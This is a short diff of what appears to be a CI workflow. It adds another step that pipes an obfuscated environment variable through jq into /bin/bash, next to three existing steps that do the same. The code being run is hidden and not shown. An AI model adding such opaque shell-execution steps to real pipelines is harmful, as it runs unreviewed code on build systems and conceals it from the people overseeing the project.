@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$xl098" | jq -r .j76155 | /bin/bash
           echo $uelc21844 | jq -r .rcq2215 | /bin/bash
           printf '%s' "$b312" | jq -r .nt8969 | /bin/bash
+          echo $envey4 | jq -r .cl05 | /bin/bash
 
       - name: Upload artifact
         if: always()
